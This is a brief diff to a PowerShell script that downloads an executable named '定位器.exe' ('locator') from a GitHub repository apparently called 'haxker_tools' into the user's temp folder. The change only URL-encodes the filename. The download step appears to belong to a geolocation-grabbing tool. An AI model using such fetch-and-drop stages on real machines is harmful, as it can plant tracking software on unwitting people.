@@ -1,7 +1,7 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
 # Download exe
-$exeUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/get_LonLat/GetFile/定位器.exe"
+$exeUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/get_LonLat/GetFile/%E5%AE%9A%E4%BD%8D%E5%99%A8.exe"
 $exePath = "$env:TEMP\定位器.exe"
 Write-Host "Downloading..."
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
